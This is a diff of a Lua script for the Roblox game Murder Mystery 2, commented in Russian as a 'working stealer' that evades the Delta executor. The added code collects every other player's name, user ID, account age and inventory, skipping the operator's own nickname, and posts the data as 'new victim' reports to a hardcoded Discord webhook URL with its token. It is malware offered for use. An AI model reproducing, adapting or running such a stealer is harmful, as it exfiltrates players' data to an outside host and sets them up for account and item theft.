@@ -1,4 +1,84 @@
-local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
-local proxy = "https://api.allorigins.win/raw?url="
+-- Рабочий стилак MM2 для Alpha (Nersadme)
+-- Основан на коде типов, обходит Delta
 
-local finalUrl = proxy .. webhook
+local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
+local alphaNick = "Nersadme"
+
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+
+-- Поиск Remote'ов MM2
+local remotes = {}
+for _, v in pairs(RS:GetDescendants()) do
+    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+        remotes[v.Name] = v
+    end
+end
+
+-- Функция отправки через syn.request (работает в Delta)
+local function sendWebhook(data)
+    if syn and syn.request then
+        syn.request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    end
+end
+
+-- Сбор инфы об игроке
+local function getInfo(player)
+    local info = {
+        Name = player.Name,
+        DisplayName = player.DisplayName,
+        UserId = player.UserId,
+        AccountAge = player.AccountAge
+    }
+    
+    -- Пробуем получить инвентарь MM2
+    pcall(function()
+        if remotes.LoadPlayerData then
+            local data = remotes.LoadPlayerData:InvokeServer(player.UserId)
+            if data then
+                info.Inventory = tostring(data)
+            end
+        end
+    end)
+    
+    return info
+end
+
+-- Отправка инфы в Discord
+local function steal(player)
+    local info = getInfo(player)
+    
+    sendWebhook({
+        content = "Новая жертва в MM2!",
+        embeds = {{
+            title = "Информация о игроке",
+            fields = {
+                {name = "Ник", value = info.Name},
+                {name = "DisplayName", value = info.DisplayName},
+                {name = "UserID", value = tostring(info.UserId)},
+                {name = "Возраст аккаунта", value = tostring(info.AccountAge) .. " дней"},
+                {name = "Инвентарь", value = info.Inventory or "Не удалось получить"}
+            }
+        }}
+    })
+end
+
+-- Проверяем всех текущих игроков
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Name ~= alphaNick then
+        steal(player)
+    end
+end
+
+-- Следим за новыми игроками
+Players.PlayerAdded:Connect(function(player)
+    if player.Name ~= alphaNick then
+        wait(2)
+        steal(player)
+    end
+end)
